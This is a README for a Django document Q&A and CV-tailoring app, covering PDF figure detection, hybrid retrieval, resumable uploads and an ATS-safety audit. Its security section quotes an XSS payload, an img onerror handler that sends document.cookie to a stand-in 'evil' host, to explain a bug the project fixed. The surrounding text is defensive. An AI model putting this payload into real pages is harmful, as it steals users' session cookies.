# Document Q&A — v2

Ask questions of large documents, and see what is *drawn* in them, not just what
is typed. Plus a CV tailoring workspace that audits a résumé the way an applicant
tracking system will parse it.

Runs on one free **Groq** key. Runs at all with no key.

---

## What changed in v2

| | v1 | v2 |
|---|---|---|
| PDF reading | whole file into memory | streamed page by page, constant memory |
| Upload limit | 20 MB, single POST | 200 MB, resumable in parts |
| Retrieval | vector only | BM25 + vector, fused, then reranked |
| Citations | "part 137" | "page 42" |
| Images in PDFs | ignored entirely | detected, cropped, classified, searchable |
| Signatures | — | detected and flagged |
| Charts and diagrams | invisible | found even when drawn as vectors |
| CV tools | — | ATS audit, score, gap analysis, tailored DOCX |
| Progress | a spinner | real page counters and stages |

---

## Security and sessions

**CSRF protection is on.** The API previously used a `SessionAuthentication`
subclass with `enforce_csrf()` stubbed out, justified by "endpoints are still
protected by IsAuthenticated". That reasoning is inverted: a CSRF attack works
*because* the visitor is signed in — the browser attaches the session cookie to
a cross-site request by itself, `IsAuthenticated` passes, and the request goes
through. Both templates were already sending `X-CSRFToken` on every call, so the
exemption had no purpose left. It is gone, and importing the old class now
raises rather than silently re-opening the hole.

**Staying signed in is a cookie, not localStorage.** The login page has a
"Keep me signed in for 30 days" tick. Ticked, the session cookie lasts 30 days
and refreshes on each visit. Unticked, it dies when the browser closes — the
right default on a shared machine.

It is deliberately not stored in `localStorage`. The session cookie is
`HttpOnly`, so no script on the page can read it. Anything in `localStorage` is
readable by every script that runs, so a single XSS anywhere in the app would be
enough to lift the account. The cookie is also sent automatically, so there is
nothing for the frontend to remember, drop or leak.

`localStorage` is used, but only for interface state: which document is
selected, an unsent question, and the recent transcript per document. Keys are
namespaced per username so two people sharing a browser do not inherit each
other's state.

**Document text is escaped before it reaches the page.** Source snippets come
straight out of an uploaded file. A PDF containing
`<img src=x onerror="fetch('https://evil/?c='+document.cookie)">` used to be
inserted with `innerHTML` and would have run. Every value that originates in a
document or a model response now goes through an escaper first.

For production, set `DEBUG=false` and `CSRF_TRUSTED_ORIGINS=https://yourdomain`.
Secure cookies, HSTS, nosniff and `X-Frame-Options: DENY` switch on with it.

---

## Run it

```bash
python -m venv venv
venv\Scripts\activate          # Windows  (source venv/bin/activate elsewhere)
pip install -r requirements.txt
python manage.py migrate
python manage.py createsuperuser
python manage.py runserver
```

Open http://127.0.0.1:8000 — documents at `/app/`, CV tailoring at `/cv/`.

### Add the Groq key

```bash
copy .env.example .env
```

Then set `GROQ_API_KEY` from [console.groq.com/keys](https://console.groq.com/keys).
One free key covers all three roles the app uses.

**Without a key everything still runs.** Figure detection, the ATS audit, scoring
and gap analysis are all computed locally. Only the written answers, the rerank
and the CV rewriting need the model.

---

## CV tailoring

Four stages, at `/cv/`.

**1. Audit.** The CV is parsed and checked for the things that break ATS
parsers: multi-column layouts, tables, text in headers, images carrying
content. Scored out of 100 across format (35), keyword match (30), content
quality (20), structure (10) and contact details (5). All local, no key needed.

**2. Match.** Paste the posting. Requirements are extracted, then matched
against the CV through a synonym layer, so a CV that says *purchasing* is
credited for a posting that says *procurement*. Application boilerplate
("only shortlisted candidates will be contacted") is stripped before any
counting, because scoring a CV against the word *kindly* is meaningless.

**3. Interview.** Every requirement with no supporting evidence becomes a
direct question. Most gaps are experience the person has and did not write
down; the questions surface it. Blank and negative answers are discarded, so
"no" stays "no". **Answers raise the score even with no API key**, because
they are rescored as CV text.

**4. Rewrite and verify.** With a Groq key, the CV is rewritten using the
posting's vocabulary and the interview answers. Then `verify.check()` diffs
the result against everything supplied and flags any employer, title, date,
figure or named tool that cannot be traced back. The no-fabrication rule is
checked, not just requested.

Exports as ATS-safe DOCX and PDF. `verify_ats_safe()` and
`verify_pdf_ats_safe()` inspect the produced files for tables, text boxes,
images and unextractable text, and both are asserted by the test suite.

---

## A note on Groq model names

Groq retires models on a published schedule, and several popular ones are already
gone. **`llama-3.3-70b-versatile`, `llama-3.1-8b-instant`, `qwen/qwen3-32b` and
`meta-llama/llama-4-scout` have all been deprecated.** If any of those are
hard-coded in another project, that project will start returning 404 without
warning.

This app defaults to the current recommendations and keeps every model ID in
`.env` rather than in the code, so a future retirement is a config change:

| Role | Default | Used for |
|---|---|---|
| `GROQ_TEXT_MODEL` | `openai/gpt-oss-120b` | answering, CV rewriting |
| `GROQ_FAST_MODEL` | `openai/gpt-oss-20b` | reranking, short classification |
| `GROQ_VISION_MODEL` | `qwen/qwen3.6-27b` | figure classification and OCR |

Check [console.groq.com/docs/deprecations](https://console.groq.com/docs/deprecations)
if a call starts 404ing.

---

## Large files

Three separate problems, three fixes.

**Memory.** `core/pdf.py` yields one page at a time. Chunks flush to the database
every 200 rows. A 900-page PDF never exists in RAM as one string, so peak memory
is flat regardless of file size.

**The upload itself.** A single multi-hundred-MB POST fails often — free hosts cap
request duration, mobile connections drop, and a failure at 95% costs everything.
So there is a resumable path:

```
POST /api/documents/upload/init/       {filename, total_size, total_parts}
POST /api/documents/upload/<id>/part/  {index, file}    ← repeatable, idempotent
GET  /api/documents/upload/<id>/status/                 ← which parts are missing
POST /api/documents/upload/<id>/complete/
```

Re-sending a part is safe, so the client retries one part instead of the file.
`status` says which ones to resend after a disconnection.

**Search at scale.** Cosine-scanning every chunk stops being viable somewhere
around 50,000 chunks. BM25 candidates are narrowed with SQL first, so the Python
scoring only ever sees a few hundred rows. Past that, set `DATABASE_URL` to
Postgres and the vector half moves onto a pgvector index with no code change.

> On Render's free tier, processing a very large PDF inline can exceed both the
> memory limit and the request timeout. Set `CELERY_ENABLED=True` with a worker,
> or keep uploads modest there. `render.yaml` caps it at 60 MB for that reason.

---

## Figures, signatures and diagrams

`core/pdf.py` finds two different things, because PDFs store them two different
ways.

**Embedded images** — photos, scanned stamps, screenshots. Found via the image
objects on each page.

**Vector drawings** — flowcharts, bar charts, org charts, engineering diagrams.
These contain *no image object at all*; they are line and rectangle primitives.
Any extractor that only walks embedded images returns nothing for them, which is
why charts routinely vanish from document search. This one clusters the drawing
primitives and treats a dense cluster as a figure.

Two bugs surfaced while building it, both worth knowing if you write similar code:

- A perfectly horizontal or vertical stroke has zero height or width, and PyMuPDF
  reports that rect as `is_empty`. Filtering out "empty" rects therefore discards
  exactly the axis lines and flowchart connectors that define a diagram.
- Bars in a bar chart sit further apart than a fixed 14pt merge gap, so each bar
  became its own cluster and none was large enough to count. The gap has to scale
  with page width.

### The pipeline

1. Crop each candidate region and render it to PNG.
2. Measure it — ink coverage, colour count, aspect ratio, nearby text.
3. Guess from that arithmetic alone: a wide, sparse, near-monochrome mark next to
   the word "Signature" is a signature.
4. Send the survivors to the vision model **five at a time** (Groq's per-request
   limit) for a real caption, OCR text and labels.
5. Write the caption and OCR text back as a searchable chunk.

Step 5 is the one that matters. Without it a chart contributes no words and can
never be retrieved, however good the index is. With it, "what does the flowchart
on page 4 show" works.

Steps 1–3 run with no API key, so figure detection degrades to coarser labels
rather than disappearing.

```
GET /api/documents/<id>/figures/                  everything found
GET /api/documents/<id>/figures/?signatures=1     signatures only
GET /api/documents/<id>/figures/?kind=chart       one kind
```

Repeated artwork — a logo on every page — is detected by hash and marked
decorative, so a 200-page letterhead does not become 200 figures.

---

## Retrieval

Two retrievers, fused.

**BM25** finds exact wording: an invoice number, "clause 7.3", a product code.
Vector search is bad at these — a rare token gets smeared across hash buckets.

**Vector** finds paraphrases: "how do we handle refunds" against a passage that
never says *refund*.

They are combined with Reciprocal Rank Fusion, which merges *rankings* rather
than scores — so a BM25 score of 14.2 and a cosine of 0.83 never have to be made
comparable, which they cannot honestly be.

An optional rerank pass then asks the small model to order the survivors. That
single cheap call moves answer quality more than anything else here, because
precision at 5 matters far more than recall at 50.

Follow-ups are condensed first: *"and what about the second one?"* retrieves
noise, so it is rewritten into a standalone query before it reaches the index.

---

## CV tailoring — `/cv/`

Most "AI CV" tools only rewrite wording. That misses the failure that actually
loses interviews: **the parser mangling the file before a human sees it.**

So the audit is separate from, and more important than, the rewrite.

### The audit — local, deterministic, no model

| Detected | Severity | Why it matters |
|---|---|---|
| Two-column layout | critical | Parsers read across the gutter, splicing a job title onto an unrelated line |
| Content in tables | critical | The most common cause of scrambled ATS output |
| Text boxes | critical | Often skipped entirely — a job title in one simply does not exist |
| Images | warning | Text inside them is invisible; a photo also invites bias screening |
| Contact in a header or footer | warning | Headers are routinely dropped — a CV with no phone number |
| Unusual fonts | note | Occasionally extract as wrong characters |
| Text under 8pt | warning | Content squeezed to fit |
| Icon fonts and emoji | note | Frequently extract as question marks |

Column detection measures the geometry of text *lines* on the page. No model is
asked whether the layout has two columns; that is arithmetic.

### The score

100 points, every one traceable to a rule you can read:

```
Format safety   35   a CV the parser mangles never gets read at all
Keyword match   30   how ranking actually works
Content quality 20   quantified, verb-led bullets
Structure       10   headings the parser recognises
Contact          5   reachability
```

Format is weighted highest deliberately: perfect keywords in a two-column layout
still lose to a plain CV that parses cleanly. The score is computed in Python, so
it is identical every time you ask, and every component explains itself.

### The rewrite

The model's brief is narrow: rephrase what is already there so the truthful
version matches the posting's language. It is explicitly forbidden from adding an
employer, a tool, a date or a number.

Anything the job needs and the CV cannot support goes into a **"not evidenced"**
list shown to you, rather than into a bullet. A CV that claims Kubernetes because
the posting asked for Kubernetes gets its owner past the filter and destroyed in
the interview.

### The export

`resume/export.py` produces a DOCX with no tables, no text boxes, no columns, no
images, no headers or footers, no list styles, and one standard font. Bullets are
literal hyphens with a hanging indent, because Word list glyphs live outside the
run text and some extractors lose them.

`verify_ats_safe()` re-opens the produced file and proves this, and a test asserts
it — so a future edit that reintroduces a table fails in the test suite rather
than in somebody's job application.

---

## Tests

```bash
python manage.py test documents -v 1
```

45 tests, fully offline, no key required. Each asserts something that would be a
real defect: a vector chart going undetected, a signature block missed, an
encrypted PDF producing an unreadable error, duplicates on reprocessing, a
resumable upload corrupted by a repeated part, a two-column CV passing the audit,
or an export that is not ATS-safe.

---

## Layout

```
core/
  pdf.py           streaming page reader, figure and signature detection
  vision.py        batched figure classification via Groq
  groq_client.py   one place that knows the endpoint and the model IDs
  llm.py           answer generation, follow-up condensing
  embeddings.py    local hashing embedder or OpenAI
documents/
  chunking.py      page-aware, token-budgeted
  retrieval.py     BM25 + vector + RRF + rerank
  services.py      the ingestion pipeline
  views.py         one-shot and resumable upload, figures API
resume/
  parsing.py       CV structure + ATS format audit
  ats.py           scoring, JD requirements, gap analysis
  tailor.py        the rewrite, with the no-fabrication rules
  export.py        ATS-safe DOCX, and the proof that it is
  services.py      orchestration
```

---

## Honest limits

- **Scanned PDFs with no text layer** are flagged (`is_scanned`) and their figures
  are still read by the vision model, but there is no full-page OCR pass. For a
  wholly scanned archive, add one.
- **The local embedder is not semantic.** It captures word overlap, not meaning.
  BM25 covers exact matching well enough that hybrid search is genuinely useful,
  but `EMBEDDING_BACKEND=openai` is a real step up if you can spend on it. Groq
  does not currently offer an embeddings endpoint.
- **Vision costs quota.** A 300-page report with 80 figures is 16 vision calls.
  Set `DETECT_FIGURES=False` to skip it on bulk ingests.
- **Signature detection identifies a mark, never a person.** The prompt forbids
  guessing whose signature it is, and it should stay that way.
- **The ATS audit reflects how these systems commonly behave**, not any one
  vendor's parser. Treat a high score as "nothing obviously broken", not a
  guarantee.
